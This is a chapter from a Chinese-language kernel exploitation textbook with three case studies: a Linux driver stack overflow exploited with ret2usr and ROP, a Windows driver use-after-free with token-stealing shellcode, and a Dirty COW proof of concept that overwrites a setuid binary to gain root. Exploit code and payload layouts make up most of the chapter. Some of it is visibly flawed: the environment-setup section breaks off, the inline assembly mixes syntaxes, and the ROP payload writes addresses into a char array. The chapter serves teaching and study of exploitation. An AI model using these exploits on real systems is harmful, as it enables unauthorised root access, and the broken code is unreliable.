# 第8章 实战案例

理论学习需要结合实践才能真正掌握。本章通过三个典型案例，详细展示内核漏洞从分析到利用的完整过程。

### 8.1 案例1：Linux内核驱动栈溢出提权

#### 8.1.1 漏洞场景

假设我们有一个存在栈溢出漏洞的字符设备驱动，其write函数存在明显的缓冲区溢出：

```c
// 漏洞驱动代码（vuln_driver.c）
#include <linux/module.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/cdev.h>

#define DEVICE_NAME "vuln_dev"
#define BUF_SIZE 64

static int major;
static struct cdev vuln_cdev;

static ssize_t vuln_write(struct file *file, const char __user *buf,
                          size_t len, loff_t *offset) {
    char kbuf[BUF_SIZE];  // 64字节的栈缓冲区
    
    // 漏洞点：没有检查len的大小，直接复制用户数据到栈上
    if (copy_from_user(kbuf, buf, len)) {
        return -EFAULT;
    }
    
    return len;
}

static long vuln_ioctl(struct file *file, unsigned int cmd, unsigned long arg) {
    char kbuf[BUF_SIZE];
    
    switch (cmd) {
        case 0x1337:
            // 同样的溢出漏洞
            copy_from_user(kbuf, (char __user *)arg, 256);
            break;
        default:
            return -EINVAL;
    }
    return 0;
}

static struct file_operations vuln_fops = {
    .owner = THIS_MODULE,
    .write = vuln_write,
    .unlocked_ioctl = vuln_ioctl,
};

static int __init vuln_init(void) {
    dev_t dev = MKDEV(major, 0);
    int ret = alloc_chrdev_region(&dev, 0, 1, DEVICE_NAME);
    major = MAJOR(dev);
    
    cdev_init(&vuln_cdev, &vuln_fops);
    vuln_cdev.owner = THIS_MODULE;
    cdev_add(&vuln_cdev, dev, 1);
    
    printk(KERN_INFO "[vuln_driver] loaded, major=%d\n", major);
    return 0;
}

static void __exit vuln_exit(void) {
    dev_t dev = MKDEV(major, 0);
    cdev_del(&vuln_cdev);
    unregister_chrdev_region(dev, 1);
    printk(KERN_INFO "[vuln_driver] unloaded\n");
}

module_init(vuln_init);
module_exit(vuln_exit);
MODULE_LICENSE("GPL");
```

#### 8.1.2 漏洞分析

**漏洞类型**：内核栈溢出

**漏洞触发**：
- 通过`write`系统调用写入超过64字节的数据
- 或通过`ioctl`的0x1337命令传入256字节数据

**缓冲区布局（x86_64）**：
```
低地址
+-------------------+
| kbuf[0..63]       |  64字节缓冲区
+-------------------+
| saved rbp         |  8字节
+-------------------+
| return address    |  8字节  ← 溢出目标
+-------------------+
高地址
```

要覆盖返回地址，需要填充64（缓冲区） + 8（saved rbp） = 72字节垃圾数据，然后是返回地址。

#### 8.1.3 环境准备

**内核配置**（便于调试和利用）：

```
CONFIG_DEBUG_INFO=y
```


或者从vmlinux文件中提取偏移：

#### 8.1.4 利用编写（无SMEP - ret2usr方式）

```c
// exploit.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

// 这些地址需要根据实际内核修改
#define COMMIT_CREDS_ADDR      0xffffffff81234567
#define PREPARE_KERNEL_CRED_ADDR 0xffffffff81234567

// 用户态shellcode，在内核态执行
typedef int (*commit_creds_t)(void *);
typedef void * (*prepare_kernel_cred_t)(void *);

static commit_creds_t commit_creds = (commit_creds_t)COMMIT_CREDS_ADDR;
static prepare_kernel_cred_t prepare_kernel_cred = (prepare_kernel_cred_t)PREPARE_KERNEL_CRED_ADDR;

// 保存用户态寄存器状态，用于返回
static unsigned long user_cs, user_ss, user_rflags, user_sp;

void save_user_state(void) {
    __asm__ volatile (
        "mov %%cs, %0\n"
        "mov %%ss, %1\n"
        "pushfq\n"
        "popq %2\n"
        "mov %%rsp, %3\n"
        : "=m"(user_cs), "=m"(user_ss), "=m"(user_rflags), "=m"(user_sp)
        :
        : "memory"
    );
}

// 内核态shellcode
void __attribute__((naked)) kernel_shellcode(void) {
    __asm__ volatile (
        // 提权：commit_creds(prepare_kernel_cred(0))
        "mov rdi, 0\n"
        "mov rax, %0\n"
        "call rax\n"
        "mov rdi, rax\n"
        "mov rax, %1\n"
        "call rax\n"
        
        // 恢复用户态
        "swapgs\n"
        "mov %2, %%rax\n"
        "pushq %3\n"      // ss
        "pushq %%rax\n"   // rsp
        "pushq %4\n"      // rflags
        "pushq %5\n"      // cs
        "pushq $return_to_user\n" // rip
        "iretq\n"
        "return_to_user:\n"
        "ret\n"
        :
        : "m"(prepare_kernel_cred), "m"(commit_creds),
          "m"(user_sp), "m"(user_ss), "m"(user_rflags),
          "m"(user_cs)
        : "rax", "rdi", "memory"
    );
}

int main(void) {
    int fd;
    char payload[256];
    
    printf("[*] Saving user state...\n");
    save_user_state();
    
    printf("[*] Opening device...\n");
    fd = open("/dev/vuln_dev", O_RDWR);
    if (fd < 0) {
        perror("open");
        return -1;
    }
    
    // 构造payload
    memset(payload, 'A', 72);  // 填充缓冲区到返回地址
    // 第72字节后是返回地址，指向我们的shellcode
    *(unsigned long *)(payload + 72) = (unsigned long)kernel_shellcode;
    
    printf("[*] Triggering overflow...\n");
    write(fd, payload, 72 + 8);
    
    // 提权成功后应该到这里
    printf("[*] Getting root shell...\n");
    if (getuid() == 0) {
        printf("[+] Got root!\n");
        system("/bin/sh");
    } else {
        printf("[-] Exploit failed, uid=%d\n", getuid());
    }
    
    close(fd);
    return 0;
}
```

#### 8.1.5 利用编写（有SMEP - ROP方式）

当SMEP启用时，不能跳转到用户态shellcode，需要构造ROP链。

```c
// ROP链构造（伪代码示例）
struct rop_chain {
    unsigned long pop_rdi_ret;       // pop rdi; ret
    unsigned long arg0;              // rdi = 0
    unsigned long prepare_kernel_cred; // 调用prepare_kernel_cred(0)
    unsigned long mov_rdi_rax_ret;   // mov rdi, rax; ret
    unsigned long commit_creds;      // 调用commit_creds(new_cred)
    unsigned long swapgs_iretq;      // swapgs; iretq
    // iretq需要的参数
    unsigned long user_rip;          // 返回后的rip
    unsigned long user_cs;           // cs
    unsigned long user_rflags;       // rflags
    unsigned long user_sp;           // rsp
    unsigned long user_ss;           // ss
};

// 构造payload
int offset = 72;  // 缓冲区 + saved rbp
payload[offset + 0]  = pop_rdi_ret;
payload[offset + 8]  = 0;  // rdi = 0
payload[offset + 16] = prepare_kernel_cred;
payload[offset + 24] = mov_rdi_rax_ret;
payload[offset + 32] = commit_creds;
payload[offset + 40] = swapgs_iretq;
payload[offset + 48] = (unsigned long)get_shell;  // 返回用户态后的rip
payload[offset + 56] = user_cs;
payload[offset + 64] = user_rflags;
payload[offset + 72] = user_sp;
payload[offset + 80] = user_ss;
```

#### 8.1.6 调试与排错

**常见问题**：

1. **内核崩溃（Oops）**：
   - 检查返回地址是否正确
   - 检查ROP gadget的地址是否正确
   - 使用GDB单步调试ROP链

2. **提权失败**：
   - 确认commit_creds和prepare_kernel_cred的地址正确
   - 确认函数确实被调用了（可加打印调试）
   - 检查是否有其他安全机制阻止

3. **返回用户态时崩溃**：
   - 检查iretq的栈布局是否正确
   - 确认swapgs被正确执行
   - 确认用户态栈地址有效

### 8.2 案例2：Windows内核UAF漏洞利用

#### 8.2.1 漏洞场景

假设一个Windows驱动存在UAF漏洞。驱动维护一个对象链表，支持创建、使用、删除对象的操作。

```c
// 漏洞驱动关键代码（伪代码）
typedef struct _MY_OBJECT {
    LIST_ENTRY ListEntry;
    ULONG Id;
    PVOID Context;
    VOID (*Callback)(PVOID);  // 函数指针
    UCHAR Data[64];
} MY_OBJECT, *PMY_OBJECT;

// IOCTL: 创建对象
case IOCTL_CREATE_OBJ:
    obj = (PMY_OBJECT)ExAllocatePoolWithTag(NonPagedPool, sizeof(MY_OBJECT), 'tsoM');
    obj->Id = nextId++;
    obj->Callback = DefaultCallback;
    InsertTailList(&objList, &obj->ListEntry);
    // 返回对象ID给用户态
    break;

// IOCTL: 使用对象
case IOCTL_USE_OBJ:
    obj = FindObjectById(InputBuffer->Id);
    if (obj) {
        obj->Callback(obj->Context);  // 调用回调函数
    }
    break;

// IOCTL: 删除对象
case IOCTL_DELETE_OBJ:
    obj = FindObjectById(InputBuffer->Id);
    if (obj) {
        RemoveEntryList(&obj->ListEntry);
        ExFreePool(obj);  // 释放对象
    }
    break;

// 漏洞点：还有另一个引用指针没有被清除
// 例如，全局缓存中保存了最后使用的对象
PMY_OBJECT g_LastUsedObj;

case IOCTL_USE_OBJ:
    obj = FindObjectById(InputBuffer->Id);
    if (obj) {
        g_LastUsedObj = obj;  // 保存引用
        obj->Callback(obj->Context);
    }
    break;

// 另一个IOCTL可以通过g_LastUsedObj访问对象
case IOCTL_USE_LAST:
    if (g_LastUsedObj) {
        g_LastUsedObj->Callback(g_LastUsedObj->Context);  // UAF！
    }
    break;
```

#### 8.2.2 漏洞分析

**漏洞类型**：释放后重用（UAF）

**漏洞原理**：
1. 创建一个对象
2. 使用该对象（此时g_LastUsedObj指向它）
3. 删除该对象（调用ExFreePool释放）
4. 通过IOCTL_USE_LAST访问g_LastUsedObj（悬空指针）
5. 如果释放的内存被重新分配并填充了攻击者可控的数据，就可以控制回调函数指针

#### 8.2.3 利用步骤

**步骤1：创建并释放对象（制造UAF）**
```c
// 创建对象
DWORD objId = 0;
DeviceIoControl(hDevice, IOCTL_CREATE_OBJ, NULL, 0, &objId, sizeof(objId), &bytesReturned, NULL);

// 使用对象（设置g_LastUsedObj）
USE_OBJ_INPUT input = {objId};
DeviceIoControl(hDevice, IOCTL_USE_OBJ, &input, sizeof(input), NULL, 0, &bytesReturned, NULL);

// 删除对象（释放内存）
DELETE_OBJ_INPUT delInput = {objId};
DeviceIoControl(hDevice, IOCTL_DELETE_OBJ, &delInput, sizeof(delInput), NULL, 0, &bytesReturned, NULL);
```

**步骤2：重新占用释放的内存（堆喷射）**

需要找到一个相同大小（或相近slab大小）、且内容可控的内核对象来重新占用释放的内存。在Windows中，可以使用以下方法：

- **命名管道（Named Pipe）**：创建大量命名管道，其缓冲区在非分页池中分配
- **事件对象/信号量**：创建大量内核同步对象
- **Irp**：通过DeviceIoControl分配Irp相关的内存

假设我们找到一个可以控制内容的对象重新占用了内存，其内容布局与MY_OBJECT重叠。我们需要在Callback函数指针的偏移位置放置我们的ROP链地址或shellcode地址。

**步骤3：触发UAF，劫持控制流**
```c
// 触发IOCTL_USE_LAST，此时g_LastUsedObj指向的内存已被我们伪造
DeviceIoControl(hDevice, IOCTL_USE_LAST, NULL, 0, NULL, 0, &bytesReturned, NULL);
```

当驱动调用`g_LastUsedObj->Callback(g_LastUsedObj->Context)`时，实际上会调用我们伪造的函数指针。

#### 8.2.4 提权实现（Token Stealing）

Windows内核提权的经典方法是Token窃取。在内核态执行以下操作：

```asm
; 伪汇编 - Token窃取shellcode
; 找到当前进程的EPROCESS
mov rax, gs:[188h]      ; KPCR -> KPRCB
mov rax, [rax + 8]      ; CurrentThread
mov rax, [rax + 70h]    ; ApcState.Process (当前进程EPROCESS)
mov rcx, rax            ; 保存当前进程EPROCESS

; 遍历ActiveProcessLinks链表，找到System进程（PID 4）
find_system:
    mov rax, [rax + 2f0h]  ; ActiveProcessLinks.Flink
    sub rax, 2f0h          ; 得到EPROCESS地址
    cmp dword [rax + 2e8h], 4  ; UniqueProcessId == 4 ?
    jne find_system

; 复制System进程的Token
mov rax, [rax + 358h]    ; System进程的Token
and al, 0f0h             ; 清除引用计数低位
mov [rcx + 358h], rax    ; 替换当前进程的Token

; 返回用户态
; ... 恢复上下文 ...
```

**注意**：EPROCESS结构体的偏移随Windows版本不同而变化，需要根据具体版本调整。可以通过WinDbg的`dt nt!_EPROCESS`命令查看。

### 8.3 案例3：CVE-2016-5195 Dirty COW漏洞分析

#### 8.3.1 漏洞概述

**CVE编号**：CVE-2016-5195

**漏洞名称**：Dirty COW（Dirty Copy-On-Write）

**影响范围**：Linux内核2.6.22 - 4.8.3（约9年的所有内核版本）

**漏洞类型**：竞态条件（Race Condition）

**危害**：本地低权限用户可以获取root权限

#### 8.3.2 漏洞原理

Dirty COW漏洞的根源在于Linux内核的写时复制（Copy-On-Write, COW）机制中存在竞态条件。

**写时复制机制**：
- 当一个进程尝试写入一个私有只读映射（MAP_PRIVATE）的页面时
- 内核不直接修改原页面，而是复制一个新页面
- 然后将进程的页表项指向新页面
- 新页面是可写的

**漏洞触发点**：
漏洞出现在`get_user_pages`函数中。当以下三个条件同时满足时，会触发竞态：

1. 一个线程使用`madvise(MADV_DONTNEED)`释放一个私有映射的页面
2. 另一个线程使用`write`系统调用写入`/proc/self/mem`（或使用ptrace）写入同一页面
3. 两个操作在时间上交错

**具体机制**：
- `get_user_pages`在`follow_page_mask`中找到只读页后，会调用`faultin_page`触发COW
- 在COW过程中，如果另一个线程通过`madvise(MADV_DONTNEED)`丢弃了该页
- 当`get_user_pages`重试时，可能绕过写权限检查，直接获取到一个可写的、指向原始只读页面的引用
- 这样攻击者就可以修改原本只读的文件映射页面

**影响**：
- 攻击者可以修改任何只读映射的文件，包括suid二进制文件
- 通过修改suid二进制文件，注入恶意代码，执行时获得root权限

#### 8.3.3 漏洞利用方法

**经典利用思路（修改suid二进制）**：

1. 选择一个suid root的二进制文件（如`/usr/bin/passwd`）
2. 使用`mmap(MAP_PRIVATE)`将其映射到进程地址空间
3. 创建两个线程：
   - 线程1：反复向映射的内存中写入shellcode（通过`/proc/self/mem`）
   - 线程2：反复调用`madvise(MADV_DONTNEED)`丢弃该页面
4. 等待竞态条件触发，成功修改只读映射
5. 执行修改后的suid二进制，获得root shell

**简化的PoC结构**：
```c
// 线程1：写入
void *write_thread(void *arg) {
    int fd = open("/proc/self/mem", O_RDWR);
    while (1) {
        lseek(fd, (off_t)map_addr, SEEK_SET);
        write(fd, shellcode, shellcode_len);
    }
}

// 线程2：丢弃页面
void *madvise_thread(void *arg) {
    while (1) {
        madvise(map_addr, page_size, MADV_DONTNEED);
    }
}

int main() {
    // 1. mmap只读映射一个suid二进制
    int f = open("/usr/bin/passwd", O_RDONLY);
    void *map = mmap(NULL, size, PROT_READ, MAP_PRIVATE, f, 0);
    
    // 2. 启动两个线程
    pthread_create(&t1, NULL, write_thread, NULL);
    pthread_create(&t2, NULL, madvise_thread, NULL);
    
    // 3. 等待，然后验证是否修改成功
    sleep(5);
    
    // 4. 执行修改后的二进制
    system("/usr/bin/passwd");
}
```

#### 8.3.4 漏洞修复

修复方案是在`get_user_pages`相关路径中确保写时复制的原子性，具体修改涉及`follow_page_mask`和`faultin_page`等函数，增加了对FOLL_WRITE标志的正确处理，防止竞态条件下获得对只读页面的可写引用。

修复的核心思路：
- 在`follow_page`中，如果请求写权限但页面是只读的，不再直接返回页面
- 确保每次写访问都经过完整的COW流程
- 增加页表锁的持有时间，防止madvise在中间介入

#### 8.3.5 学习要点

从Dirty COW漏洞中可以学到：
1. **竞态条件的隐蔽性**：该漏洞存在了9年才被发现，说明某些竞态条件非常隐蔽
2. **复杂内核子系统的交互**：漏洞涉及内存管理（COW）、proc文件系统、madvise等多个子系统的交互
3. **利用的巧妙性**：只需要两个线程和两个系统调用就能触发高危漏洞
4. **修复的重要性**：该漏洞影响范围极广，几乎所有Linux系统都受影响
